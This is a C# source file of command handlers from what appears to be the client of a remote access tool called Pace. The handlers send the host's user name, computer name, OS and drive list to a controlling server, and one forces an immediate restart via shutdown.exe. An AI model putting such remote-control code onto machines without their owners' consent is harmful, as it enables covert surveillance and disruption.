using Pace.Client.Configuration;
using Pace.Client.System;
using Pace.Common.Network;
using Pace.Common.Network.Packets;
using Pace.Common.Network.Packets.Client;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace Pace.Client.Handlers;

public static class SystemHandlers
{
    public static void HandleGetSystemInfo(PaceClient client, IPacket packet)
    {
        var systemInfo = SystemInformation.Get();

        var infoPacket = new GetSystemInfoResponsePacket(
            ClientConfiguration.Identifier,
            client.LocalAddress.ToString(),
            client.Port,
            systemInfo.UserName,
            systemInfo.ComputerName,
            systemInfo.OperatingSystem
        );

        client.SendPacket(infoPacket);
    }

    public static void HandleGetDrives(PaceClient client, IPacket packet)
    {
        DriveInfo[] drives = DriveInfo.GetDrives();
        string[] driveNames = drives.Select(drive => drive.Name).ToArray();

        var response = new GetDrivesResponsePacket(driveNames);

        client.SendPacket(response);
    }

    public static void HandleTakeScreenshot(PaceClient client, IPacket packet)
    {
        throw new NotImplementedException();
    }

    public static void HandleRestart(PaceClient client, IPacket packet)
    {
        Process.Start("shutdown.exe", "-r -t 00");
    }
}